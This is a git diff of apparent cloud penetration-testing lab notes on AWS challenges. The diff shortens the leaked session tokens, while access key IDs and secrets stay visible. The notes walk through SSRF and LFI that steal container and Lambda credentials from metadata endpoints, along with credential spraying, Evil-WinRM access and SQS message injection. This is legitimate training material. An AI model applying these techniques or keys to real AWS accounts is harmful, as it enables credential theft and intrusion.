@@ -176,7 +176,7 @@ The token can then be used for more juicy requests to the service
   "Type" : "AWS-HMAC",
   "AccessKeyId" : "ASIAWA6NVTVYRAJE4MWO",
   "SecretAccessKey" : "DvwdhlDdP13AnTPSgkk5LpToQSQGehcA3JK94gAG",
-  "Token" : "IQoJb3JpZ2luX2VjECMaDGV1LWNlbnRyYWwtMSJHMEUCIG9N8Fiy/2ew8j5egLDkoeqF5V3wPwK4jGe4cLAktbaPAiEA7Lo0iVA66CG8aEqNowjAmf4WpaY7dlikuOSXUEfiZ5Uq3wQIvP//////////ARAAGgw0MTQzNTg4MDU4NzMiDBmFU+syY8xirSbpHSqzBKUBkhtt3XJnGJdkbjRY6lywCQnlw8ANYcelnRP00P3dlyIb+QRHhCX4HLuYT7tzytaCNSRHmoEhuPebzxnQOqGVZNT03fseOGdlodl2tA+eX6RIRRwbYoe1TL/CZDltqR84EM7QNsODtTtsXc6LWbnDQH5aY8IhSCGNMyLThcuWxXHz1xXsJpyoSQD5gu1jeRi5wcZceF2P5A+anCV2PGxYGcc8PY4e2ySfL43pWVWJ20et7+lWFUoQgmf6jyiBr6SYr8c76/E98bndzQBnNIoUVjNuUDAvj4x/orFY1onssKMIH8ZUawodh1Q6jw3FTQjSf4rba/aNA4a6vZAnrrUNOsprmoZjv3yx6yHF3g5crL5FX5jPkzSvsz3tOZ9sYUu3g3h3TUjrdlZhA6z2yo/AK7XD7CHa1xwc8FOagBBqRYfGyrL7TNPZXa2EyQkfhI++9EzL4Wpbih/zcVVnlKUfJl610O3X3hJHst6rj6TZAuMP05g8LHdqdIkACFDmcCARKNL7I6KFFPS0sgLqYsu3FkrN55ZXXW4EmvdrnBTmdPfSL9hh77BbLH0uWQU1KhvI5fTmDnUGU24sUF/WQYQQKZShJ0sH82ivEmVFkD7157926d5Hensomg2spNoIXYj+uFGp/iAA9ySEQhz/WGqTJH/GBrp13e0smOusYdU75hg2aax3SPO3m25V29p6WjEajmPpbNkrgHqXXDxqiwF8awNDRuXl0pyPsM00RaW3o/tvMNS60p8GOqkB4S+G+taayWybv6Am85Ae7pSqwfMknjwBZfOTvTbVCydV2RpcZyv1gjqJhOguZZAQzv6rADK2OeBN0bmnNPxY4Om36AQ8eGdpZbs2naGBdCioV5UyLE99Y6dpI9881UG+i9i2qs0EclJLUOgxCdJIlV8j4AgURs2SZeuxfo5ZanG3LubP9BJGGLbLwo5CPDTHA0usGEDYZD1l0A5Ln6mB0EjB2py+g0Omew==",
+  "Token" : "IQoJb3JpZ2luX2VjECMaDGV1LWNl.....
   "Expiration" : "2023-02-21T17:05:44Z"
 }
 ```
@@ -187,7 +187,7 @@ To leverage the extracted secrets in the AWS CLI, fill in **~/.aws/credentials**
 [default]
 aws_access_key_id = ASIAWA6NVTVY5CNUKIUO
 aws_secret_access_key = wSHLoJrGVnjfo+xxKwt1cblFpiZgWF20DMxXpTXn
-aws_session_token = IQoJb3JpZ2luX2VjECEaDGV1LWNlbnRyYWwtMSJIMEYCIQCnZUyvONtQlYo9E7wvsBQp5yozH/EiPnO4BoXXajyIiwIhAMsOP10IS+ItChhHgzvKMprEPJkKpWl5GKTH3hInYv6gKt8ECLr//////////wEQABoMNDE0MzU4ODA1ODczIgyan7zp7MCE5SEbGO4qswTx/skDLRfBDHMnkXE9rzH7YXvEjXchuasGVywChi9vFyoujll7wc3gmts+LRrgrTC+lV5p/uDC3iHloXiPuEgf6YDRB0OoX4J9jKooGxBAmbdhyvL6kivHlywONtLE8mcf3SrC3ZZqyJ/5KQX+NWNt8Vj1GC/HNssYuToHOLExmUsm5Pw3VgElvcgRaovgU3hwQGLBh7gXCFzp4rAW57jaOcARGQJQr/ONYzgSIZ9LNqMjSBZwREVmTJVhzrDbz7AoPdERnz+K374jd/s+3k7ujBgYxOlk/0Osl7J2+79Wj5+7TDfQXulic/bEwJdCdFX1gcpN5CG3uXnQZQ1USwX4Zb6TSPvHutOOpDjX9pvG2qPt7QC5SV3EuDSOLNvPVrFExOKJcaQhryhZW56hHBpUyVkl5USV2KiAPaniJ6RjYewBX844ddYYaJGp9UEQSxovXPh0mwEKenVTegi3db1bMPkX0CT7IS4GO6bv71/++zQp+pl3fOvp9ixbAa3vzbawLQvpENHpDyRH9K6UT1VPFGK4tbgmrUmBytYp1SKc5UvEDJFg51htlk19MXO3F3fSUWPB5kuo6AEpxnzqElWagBVwswgt6hh0spVjm7PAoO7xTm9yfEc60li/RYGnT4PRQmlbiXiB/sdHVcM29Fmkg7aKo013z06OYNuzIF+Bldf2ziuL8rFM1aU0Af77lUNgpAto0A38iY3a1vBr9xpUJ6ZaXVxMXCbIKG8vTZ94P4f8+TD2idKfBjqoAT5RSXeKY76pZ+P1vOIE+btQjCYsqFzhQwDsk06w+9G89Pa5dVMvhOI0NT0foZeX7aJFhcHigrC5pPkooNQ0wBm1waotdwDTPEKAOwL8HHvtUiuohdR6kYNxKwzqt6g61HcNVd2qzoxf31uDMquXq3OdvcPZHR4LyitKGcptgjQ21ZzcIiuqsqg4k879O8D8v4U3GBSQk7B5UK/2pVKPmqLs/X4cTxUkmQ==
+aws_session_token = IQoJb3JpZ2luX2VjECEaDGV1LWNl......
 ```
 <br>
 
@@ -696,7 +696,7 @@ flaws
   "Type" : "AWS-HMAC",
   "AccessKeyId" : "ASIA6GG7PSQGRWLZRMOX",
   "SecretAccessKey" : "fxPUS3him5NGOskB7dvv8QfeKQGIAarcG6+k2MER",
-  "Token" : "IQoJb3JpZ2luX2VjEFwaCXVzLXdlc3QtMiJGMEQCICBnNMSti0rX4OpuIIfGDaC28Pk1WcUhCd6Shl6kxRzrAiA0CaA/VSt9cX3ZPy54DgbV+DDWBc0XThYG8JvvjcIzRiq7BQj1//////////8BEAQaDDk3NTQyNjI2MjAyOSIM1U/3SbZen5pKDpMmKo8FyRuRBIPGuIcTfrFMGMH5e1HSwgks8J4Tm81jKkP66luzCFQQ0hbq6tC4KSKpBcUVknTqb9RrLUQGjhxPhxP+IwSIGsNhQ6oHKTQRQnfmZcWR7+bRqMvto4EAADhxmAv4U/tS1i5aMZqcrp04ppPiquJVw810YX++YoXqMhVJV8+7k0/sLWgo3eGH52nOGOn3P8109THUYSEIk3G0Mf1iG8EwnHSN834QwwC5BiB+mAybQnQVBbCMXXGsGj4oTMa0ufgqbuX7FoaA26/9j2CN3pvR/cXtugIJi58GhHUxwEdQvadptYZtbOeDkWBcliWlHUdtn2AzdcweUnoGtW1AwsOxkh/p2Z3HBBM94cF4/Op0/QDjjPdqx2H3xbs/L2kkEuf/SzFymLQw/LuSjVEOmUEyq8kmvA3jVvXDudfgEuG1ItS97+BctDF/2lYdB2X8BzE7fe1VvpNmHdMEp+DNH/l3dQ4m6Xu6DnFR2Q3C/xpgBIlAcT4hXDw6W6Xo8OvLGCdOJvFRJMAhbFfeXHmoA9hrzxsJ1FdCd0EeRvXuMbx/75hifWdGP4ht6iBifizcIyAu0cm9mmn9hn8C+Lq9r6K3ssLdNuHge3DO0IA/vXvg3Qbv2wf29ilHQuvnMGzq4vi2RzZcnxjmnJlGxRRvzbNgZHWvsXlP6eFG4SkStKpFuZkX2ZjaTI7drz1F6LubOi29UC1fC31o1Fztt0teciq81gZjTSAK5KaSgAqg6AJusvjTjoHtRNoSbKiF3D4YYVghPp70momLE56FiLpvp2XfJW06hAgESykze2xag9DGv8NtGE1OwQimpnODMD2X5Z5iIW0xccxelBhxLnfrYMsC86Lgv/ufk0H8+IX7XTDC0qXHBjqyAYkWr9rnzWjtfhMdEU26yk5fYNCi55MPMLK/CPhJhmc62LsRrKNj+BcHQ0z7iX/pwhiWngHvadDmEKitJniTuK2cq6QgPah6IIytHC5soHltKquPve26qf22UUM5nlPGeTH9ElQcwk5ePRFQDAez9NUDSj6s/yE5VPK0utgGk4yyCkdmOgsulPVl6FNOFvXgt6TnTiLCcGp0kZhzTzn+Dzx+x8mNhaLB8TukTg99n3gx8T4=",
+  "Token" : "IQoJb3JpZ2luX2VjEFwaCXVzLXdlc3QtMiJGMEQCICBnNMSti0......
   "Expiration" : "2025-10-11T02:23:14Z"
 }   
 ```
@@ -928,8 +928,7 @@ We  can request a download URL for each layer with the following command. This r
 └─$ aws ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
 
 {
-    "downloadUrl": "https://prod-us-east-1-starport-layer-bucket.s3.us-east-1.amazonaws.com/c814-653711331788-58b3a0a8-1806-5777-1315-c2d788e36c12/1e964f10-a061-4e7b-9290-4447e821fe9a?rid=58b3a0a8-1806-5777-1315-c2d788e36c12&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJIMEYCIQDxq1BlXLjU2Y9W7MHIgMsl0ksBT2ZV35qpzk%2BYDLiqRAIhANXG3788LS%2F%2BdIwkChtkbKj8f0JScpBKMCxHp5XhNalqKr8DCFwQBRoMNTkxMTA1OTE0OTUyIgwaxuyOPqWg243BMmMqnAOxaw3PNDqaTPHUT08fGqlw4FLCi0zj3KLwpNE3hpblb06FJH3fNjQAufUVUig%2Bo3EqDLMTJhUCZluA6cMSgGvKCUBMV6HlNwp4qlf2sCH28IzF4Gk%2BcxsiSsyBMEClyVOO3MG%2B2HwM5VXi6WY1pnPK7B5jwdneMaQ0F1V7XDpa0SgfdWyezzlBq9YKJzu%2FDFKLMikJX6UPfn58wWERZjiUThqvbJBVLx8Mxfi9LOUt8mJKQ5CDmhyNFXYgVPXzEWlBxCw8bySt9Au9gpn%2BV3LNuTNcd5sI3zXioTqyLKki9gWBkxvkxRIkRnGmwSjr522DDVrUX1elhV7C6fGwib8%2Fb01XfEQgqFnlUbBREV7Woltep2VODwx4WqVdEcUBHCuK33LY6NDU4Wjo5aaOewEtuWqch7wG9VWb6T0fZjCpXdZqXpScQJl3dEuMrZ2zX9mxWxG22PhrerAFCOFoN8r23ny68TNoOgD%2FwXq7glhJg8veJku2Kl79IQ7CE16MTtIX9Ma%2BjkuBsd3VMnp1SJCtYXFCMWSXG82epxCPMOXIuMcGOqABCsoj%2FMOQKSJ9Awiw%2FL1AShhj5WlUhRDnR%2FCbTDya2T6gH0yc16gk3Et%2BFoAIYe5P538tsWExVhkebn%2FvJNMxnA8%2Bm0hAZy%2FuKDl1itSnXLHnsIgiLCbHbQk3%2F5DC20WzAwDYw6xRRPz7OcJsVhFCXAvJKtXHpLRx8m%2FUrx%2FpPpcEDR3bh1%2FgJUtnZwKFJzrNZLheH17hJGtK1mHKqodjnw%3D%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20251014T104839Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=ASIAYTIFIPBEIVU7JJMK%2F20251014%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=64397e61611082a5c2c251300ba2d8b682e77bce2007613b58ae5887f4421b3f",
-    "layerDigest": "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
+    "downloadUrl": "https://prod-us-east-1-starport-layer-bucket.s3.us-east-1.amazonaws.com/c814-653711331788-58b3a0a8-1806-5777-1.....
 }
 ```
 
@@ -958,14 +957,14 @@ Once again this screams SSRF! AWS containers running on ECS usually have their c
                                                                                                                                                                                                                                            
 ┌──(kali㉿kali)-[~]
 └─$ cat out.txt                                                                               
-HOSTNAME=ip-172-31-47-179.ec2.internalHOME=/rootAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/7e4ba77c-58ec-4523-bb72-1f719c03a12cAWS_EXECUTION_ENV=AWS_ECS_FARGATEECS_AGENT_URI=http://169.254.170.2/api/cb2fb3252d31461abd9fcd33b7980cc5-3779599274AWS_DEFAULT_REGION=us-east-1ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/cb2fb3252d31461abd9fcd33b7980cc5-3779599274ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/cb2fb3252d31461abd9fcd33b7980cc5-3779599274PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAWS_REGION=us-east-1PWD=/
+HOSTNAME=ip-172-31-47-179.ec2.internalHOME=/rootAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/7e4ba77c-58ec-4523-bb72-1f719c03a12c....
 ```
 
 The important part is `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/7e4ba77c-58ec-4523-bb72-1f719c03a12c`, we can curl that with the proxy...
 ```
 ┌──(kali㉿kali)-[~]
 └─$ curl http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/7e4ba77c-58ec-4523-bb72-1f719c03a12c
-{"RoleArn":"arn:aws:iam::653711331788:role/level3","AccessKeyId":"ASIAZQNB3KHGPGUE3GXV","SecretAccessKey":"6LcdopLQNXKE2gLAXtiljUG3H9zZ1/C3AKmaspUt","Token":"IQoJb3JpZ2luX2VjELT//////////wEaCXVzLWVhc3QtMSJGMEQCIFqUoPnGlFEsLppoCGJeYTlwJHJ3kXZ9D4sdJGD8Y0EHAiBRK1oZ4P2LeH8TIWYO6tx/ixLJ/XmNhs88BQ6nIK2QiyrjAwhdEAMaDDY1MzcxMTMzMTc4OCIMV62/1us3tMbhL/mtKsADlYozTDyb5dHhKyIah3rXEeN+YBIDA7g9w29tYDwolOF+HDhN2gdvHzFBRMboz8XDcVcW75tjjB61600z77i87/5cWXxKqsdx/obAVcxmJSJBCMc9fQvVGBoM3VmYxDL0duIbSfDVGJKfIvX1BmSYccJizcZTR6Xn3nTrPBV4btT3TimJTK4YWjqthMUG9DgQ3lVZFxzY0aHDtzSyLahgD0kIyj41+vA7yan7OkL240CFl7AkWWCjSfUoybatFTwPbI5Qz15NPijQTTAoc/4HHE8bkuY3XAUiWYl1E/gxrfBd2EL+BqXDRQX9Cud6TnOFzFhCk75T1GcmvzXPo+xEtNaXDodXM0mr+Z8Mk2owLXt1bwxEttX9rQRwd0iVcKhq8S1ZhknlO4eGImGCAmnVxOFV+2BDikG26w7ZFfWuXqztgUH4RIfBEZBZoClUu79B3XLlTz0hEmsQHwxX8FzgO49D9yjoWHpSEHlzpowu4SR5rtQE4XaSxGs4NAd0qtSJH7a8R58USl2tckwQ/j2Pi4jkaeSnbeeNAElxeGXxH34xSFhlS/WRK8elP71XwDZN2I83fq7TPinCDzq6B8dq3jCl7rjHBjqmAbkJOU3X6u1HDEebQ/XT2yAxxxNzWF4QksKU9WFG7ffYsoOwVryeWJ0xjvB5y94IIEDgTG4RWf8Fe+PxLsOh9yB6JhzTP9JYYo4/fsCNuUc9YRZrS4HKOQ3YJ11XOPnRkmc+RtTz6PaEs3ug6rO2Y6ecJxT/DCq40GF/+Ta9aetpBHaAUx27kz8VSOJPAw25o2A1DjDrJ1HW7aU1ue1amurdBsySc8c=","Expiration":"2025-10-14T17:42:29Z"}
+{"RoleArn":"arn:aws:iam::653711331788:role/level3","AccessKeyId":"ASIAZQNB3KHGPGUE3GXV","SecretAccessKey":"6LcdopLQNXKE2gLAXt......
 ```
 
 Add them to the credentials file and test them
@@ -1097,7 +1096,7 @@ or9vBtyYCFsO2IMHgKffq0Kdzwk/syyNOA5iJCx5BNM=
         "Type": "",
         "AccessKeyId": "ASIAWHEOTHRF6G2LNQPT",
         "SecretAccessKey": "o9oJoJOFNqeyErKno4A0TmfKVYfdjokyOSZ8Ff+e",
-        "Token": "IQoJb3JpZ2luX2VjEAQaCXVzLWVhc3QtMSJHMEUCIQDbrI7eb+9M3TYRoOJD/1T8ocbK870YnLNJAi4vp/7crwIgB7VgaYYk7FxppNQ1NNTZkW34vWNphrawYrN8pCypyp0qgQMIrP//////////ARAAGgw0Mjc2NDgzMDIxNTUiDG3huk82EtXbGzxTUyrVAuE7JApdxWdN8Faqtz31XXTXVtndCgqGoA7/Blr15kz5qfDU5WaUokIUGn7EWB2TFM38FV73kdRVqe6M3uO33l/2b5uI7IET4Yzdk4zXIZB4ldS7+fLxz+eSwOiW8jw3+/MwHdFAotu6IHQ01RQWleuGVVMCcD5GZ7z71lUEoX8ad7cyoT7lbd0QeKukgpVfnbpAzwPJk+W2aqhD0MORMu+QTG01ygXmnzRdNI/+f4ja+XCNsfL9kzbRi2H1kXQnIwPCKnCaV2TOpk5zfa5lUMCiMYxsab4d60BvBDn5UY3bqKp7CuDhuCZb3V+uCRPKylJhEukee/9+1DyZVcnuqdnHXOMpbV3b00DIrL94okducl1WhOxEMpYK4+NKX5VxzAwZEDBWPksmbdYnqHBkLtKeo7QkHypV6kfL++CzBnW8giEpIqmXnIqzsmGriahRkdlNj7sHMN2jyscGOq0CqID1/VWsNHFTOuk1QHzNKNcjvBCaKJKHF4ElLfQ9wwVYjqkFXyjEQnjKo327veVp/npNFuUe4d8OUC0sxYnTZyIpKO7cB9VBJbqVdfB9S4GqtWVL447sKjTCZsJYhj3f7nmAEqg6BagP2SZ2RiMfMGmciXOd97RfYMXFuqYRfB5Kd5WY2Q4pMVPwxCoT2QYWJlFbEDYVvd76rXNfJ0T9jFmGD++hqQq1Z/MOy1328tojgVAlVVwVnMa6OIyuHr81lwegCZP/w3JYKyJ+Xq5V75tE97kG4wP6pGJyMEwnxwymrvl4q9bjkm2zDNRJiu/J8+2Pz5VVDS1jJdiQFpG3HoY2Jjd7Gk5pc3D+Jb0XTwgBs75MO71V7R54iRaaxZyPFDkC2OAYbKhHcsWbjw==",
+        "Token": "IQoJb3JpZ2luX2VjEAQaCXVzLWVhc3QtMSJHMEUCIQDbrI7eb+9M3.....
         "Expiration": "2025-10-17T19:35:10Z",
         "Code": "Success"
 }
@@ -1272,7 +1271,7 @@ The syntax is very similar from service to service, so it's fairly easy to invok
 {
     "InstanceId": "i-04cc1c2c7ec1af1b5",
     "Timestamp": "2024-12-01T07:51:43+00:00",
-    "PasswordData": "s2QgAyMRT/OAjxv2F5FKSaco4lISg4kS+LTajSjr9eTHaKE0AdX0u7AaLzicaHV9Ki2Ue4OduBIxRPuwmzWHyUR/ZNgaIZIPCuh2XMDs4kUmvrJFZkU22WqpYQ16AUbJAvwVfNWew7nIpWpRLNB2WUom43vofSPPh3a6+xsDewgQmV0rZ/caDsfcIKASojoQ2tWpKxlz7vlUsyciDE1nuFfuOo5p5E27lWGrcyHzigHh3ErsSKq5lqQI7i2Fry0FSVowb+lXv8DVwjq5oSVP6ibrRPWqCsKWJadYg2engXL8c8vD2imPtc6wOa2wCx1CTV+9IyIKhJEE2yADo5B+Cw=="
+    "PasswordData": "s2QgAyMRT/OAjxv2F5FK.......
 }
 
 ┌──(kali㉿kali)-[~/Desktop]
@@ -1329,7 +1328,7 @@ After an nmap scan, 54.226.75.125 has port 5985 open (WinRM). With it-admin's la
 Enter Password:
 <snip>
 
-*Evil-WinRM* PS The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\n    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException\n    + 
+*Evil-WinRM* PS The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program......
 ```
 
 After lots of troubleshooting and attempting to escape a restricted shell, I just decided to use crackmapexec. Combine Windows post-exploitation skills to loot for credentials and exploit the local machine further
@@ -1421,7 +1420,7 @@ Enumerating EC2 launch templates. One interesting parameter is the user data scr
             "LaunchTemplateData": {
                 "ImageId": "ami-091f18e98bc129c4e",
                 "InstanceType": "t2.medium",
-                "UserData": "IyEvYmluL2Jhc2gKCmFwdCBpbnN0YWxsIC15IGF3cy1jbGkgZG9ja2VyIGdpdCBjdXJsIHVuemlwIGh0dHBkIG15c3FsCgpzeXN0ZW1jdGwgZW5hYmxlIGRvY2tlcgpzeXN0ZW1jdGwgc3RhcnQgZG9ja2VyCnVzZXJtb2QgLWFHIGRvY2tlciBlYzItdXNlcgpjaG1vZCA3NzcgL3Zhci9ydW4vZG9ja2VyLnNvY2sKCm1rZGlyIC1wIC9vcHQvaHVnZS1sb2dpc3RpY3MKY2QgL29wdC9odWdlLWxvZ2lzdGljcwoKYXdzIHMzIGNwIHMzOi8vaHVnZS1sb2dpc3RpY3MtcHJpdmF0ZS9jb25maWcuc2ggLgpjaG1vZCAreCBjb25maWcuc2gKLi9jb25maWcuc2gKCmF3cyBjb25maWd1cmUgc2V0IHJlZ2lvbiB1cy1lYXN0LTEKCmRvY2tlciBwdWxsIGltYWdlcy5odWdlLWxvZ2lzdGljLmxvY2FsL3dvcmtlcjpsYXRlc3QKZG9ja2VyIHJ1biAtZCAtLW5hbWUgbG9naXN0aWNzLXdvcmtlciAtcCA4MDgwOjgwODAgaW1hZ2VzLmh1Z2UtbG9naXN0aWMubG9jYWwvd29ya2VyOmxhdGVzdAoKZWNobyAiUGVybWl0Um9vdExvZ2luIHllcyIgPj4gL2V0Yy9zc2gvc3NoZF9jb25maWcKZWNobyAiUGFzc3dvcmRBdXRoZW50aWNhdGlvbiB5ZXMiID4+IC9ldGMvc3NoL3NzaGRfY29uZmlnCmVjaG8gIkFsbG93VXNlcnMgZWMyLXVzZXIgcm9vdCIgPj4gL2V0Yy9zc2gvc3NoZF9jb25maWcKc3lzdGVtY3RsIHJlc3RhcnQgc3NoZAoKY2htb2QgLVIgNzc3IC9ldGMKCmZsYWc6IDc5N2Y5ZWRmZjVjYmRhY2E1ZDA5MDIwMzBiN2JjZmU4",
+                "UserData": "IyEvYmluL2Jhc2gKCmFwdCBpbnN0YWxsIC1.....
                 "MetadataOptions": {
                     "HttpTokens": "optional",
                     "HttpPutResponseHopLimit": 2,
@@ -1708,7 +1707,7 @@ We cannot login because the user is not confirmed. Pass the following arguments 
 {
     "ChallengeParameters": {},
     "AuthenticationResult": {
-        "AccessToken": "eyJraWQiOiJDTFRKamV3bm5sT3BXTmxzOTZhbW1veEtZaHFqMVBuWjJrMXdMVVg2bno0PSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiI2MjdiYjMyMC1lMjVjLTQ5MWUtOWI4Zi00MWQ3ZTMzYTgwNzQiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV84cmNLN2FidHoiLCJjbGllbnRfaWQiOiIxNmYxZzk4YmZ1ajlpMGczZjhiZTM2a2tybCIsIm9yaWdpbl9qdGkiOiIxNGFkZWFjNy1jNjlkLTQyOTMtOTFkYy02YTE1ZTJlNWZmOTMiLCJldmVudF9pZCI6IjkyOWUzN2U1LWQ0MzEtNDdlMy1hMzI3LWYzZmNjMzA1ZjQzNyIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLm
+        "AccessToken": "eyJraWQiOiJDTFRKamV3bm5sT3BXTmxzOTZhbW1veEt...
 <snip>
 ```
 
@@ -1754,7 +1753,7 @@ Below we enumerate the lambda function. Download the code with the URL at the en
 },
     "Code": {
         "RepositoryType": "S3",
-        "Location": "https://prod-iad-c1-djusa-tasks.s3.us-east-1.amazonaws.com/snapshots/427648302155/huge-logistics-status-ebb6abbc-63e9-47f8-b5a3-9dfc4c2e69dc?versionId=GXaKVxYEoBEFPyPl3E9avQChcfMNvUCf&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIEMWzFWqSSr7Kth%2Bfp1WotsjyBCtJHp7vTVUduDJywDLAiEA40LBm5JRSgo%2Bg7HUHlk%2FCBCQXovGnLOUisibSODA%2BhIqiwIIbRAEGgw0NzkyMzMwMjUzNzkiDFHx6f1vBE2UHbfZDCroAbGF27zxcGWYcwzHCBpekOkSuMjVOZPWJK4MMix5gfJPUqD8fESXD0tKaIkTJdLtV5iLHt3Pp4ENn26fonpiGSk0aOHIgpefG%2Bmp4Jv9fXg1h6xPlsFcnFDbZyeRq2ycp5QF%2FquALWAZiZqZdyYhNwVQWQyM1V1w5blysI1OJexHk8NqK2RuEqGzMUsgaB5RPfzbRGT3KLPwrg6%2FAoERRyct52NpWzOeBugYkZRQqJE1eXQVtvD15ny%2BMBl7Px9snMy9akh3d20io4o1wzGm%2FPZMrpy2Tz8wmtYZ%2FHVKIIiAtK%2FnTiemszgwoIbxxwY6jQG7ETrft6DsLcUv80CNAdm2J4dd83raAJMBo6QorvlTgZr4gDmt3IfhsBOT2yS70PY7GP8oKR4pb5sW9NLPLNrAKGi%2F0Pb1FoHoC9DWWUuLsqQ7a%2FemJOyAuN62er%2F040WILelIO7Ssbrbs0EhIwvp6Xgg3FViSJ%2FhRs0x%2FU5N9vYqPh3F1yqRgHaLYLmQ%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20251025T135601Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIAW7FEDUVR2CBYKEDO%2F20251025%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=cca7694ded32eb02933e621dc40db8bc49b17b5279f82ea4f69a2c8010f93ea7"
+        "Location": "https://prod-iad-c1-djusa-tasks.s3.us-east-1.amazonaws.com/snapshots/427648302155/huge-logistics-status-ebb6abbc-63...
     }
 ```
 
@@ -1769,7 +1768,7 @@ This functions is vulnerable to an SSRF vulnerability. Exploit it with an LFI to
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ cat out.json| grep -i 'aws'                                                                                          
-{"statusCode": null, "statusMessage": "Service is not available.", "body": "AWS_LAMBDA_FUNCTION_VERSION=$LATEST\u0000AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEL7//////////wEaCXVzLWVhc3QtMSJGMEQCIBo6Ig9pIW4/0GZXIqQqFe8lZMksInFpft0l2lpF/iPNAiBTpVu5Jc5PDY0neA/MvMM51PyahloDhlhYLRR+rxbt8Sr+Agh3EAAaDDQyNzY0ODMwMjE1NSIMFOswJW+imlKCzEu5KtsCRkq52fQ6VnI6KKlRHkN71qUcvi4I0aPvVwiHBk5mUgddp9ZVFWt8mg3Nz/nUiYIWkQ9fFwaYr/eCmfwRt6gWFumMSXLe+jY05hNT2Zp7/WzMtEuF000dGitNzyxTJ8FH6k1nA9anERf039Dobx6ifz9plkAdh5rsKv6HgCNDb8/SSOev80rk35zZHzqwccrlboQxtPwZ4/zWs6MOQxrFMBAOBfy+VBeQoRWujwCkd9NQT5y8wVInNB+wPVxarXDDjn4g3D81s/wHL6mbkqkhbKbuiJQ0/V7UAiHvgHw/tQwZDX1DpR6pMe0isYiZXQUXMJYHK/wAXV
+{"statusCode": null, "statusMessage": "Service is not available.", "body": "AWS_LAMBDA_FUNCTION_VERSION=$LATEST\u0000AWS_SEe...
 <snip>
 ```
 
@@ -1982,7 +1981,7 @@ Enumerating DynamoDB
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws dynamodb describe-table --table-name user_order_logs
-An error occurred (AccessDeniedException) when calling the DescribeTable operation: User: arn:aws:iam::243687662613:user/migration-test is not authorized to perform: dynamodb:DescribeTable on resource: arn:aws:dynamodb:us-east-1:243687662613:table/user_order_logs because no identity-based policy allows the dynamodb:DescribeTable action
+An error occurred (AccessDeniedException) when calling the DescribeTable operation: User: arn:aws:iam::243687662613:user/migration-test is not authorized....
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws dynamodb describe-table --table-name analytics_app_users
@@ -2048,21 +2047,122 @@ Use `GoAWSConsoleSpray` for credential spraying
 
 ---
 
+You can invoke functions without having special permissions, here we only have `ListFunctions`
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws lambda invoke --function-name huge-logistics-stock out
+{
+    "StatusCode": 200,
+    "ExecutedVersion": "$LATEST"
+}
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Desktop]
+└─$ cat out       
+{"statusCode": 200, "body": "\"Invalid event parameter!\""}
+```
 
+The parameter can be brute forced, Param Miner style. My script takes a hardcoded wordlist and only prints the output if it doesn't contain the "Invalid event parameter!" string
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ python3 try.py
+[+] Word: DESC
+{"statusCode": 500, "error": "Invalid trackingID, refer to queue"}
+```
 
+We also have SQS permissions, this 
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws sqs list-queues                                                                                
+{
+    "QueueUrls": [
+        "https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics"
+    ]
+}
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws sqs receive-message --queue-url https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics               
+{
+    "Messages": [
+        {
+            "MessageId": "01db93d6-ce0b-44a2-9fa3-baa6aafc8f28",
+            "ReceiptHandle": "AQEBDb6SjFFQEUJCk2Ynua....
+            "MD5OfBody": "1c9429682ec6e97f45a2283605ee8bf9",
+            "Body": "EY shipped package of 418kg",
+            "MD5OfMessageAttributes": "092ab012001f7494fdaa78c1078e6918",
+            "MessageAttributes": {
+                "Client": {
+                    "StringValue": "EY",
+                    "DataType": "String"
+                },
+                "Weight": {
+                    "StringValue": "418",
+                    "DataType": "Number"
+                },
+                "trackingID": {
+                    "StringValue": "HLT2073",
+                    "DataType": "String"
+                }
+            }
+        }
+    ]
+}
+```
 
+We can craft our own SQS message and send it to the queue. Later we can invoke the Lambda function to track the item
+```
+┌──(kali㉿kali)-[~/Desktop]
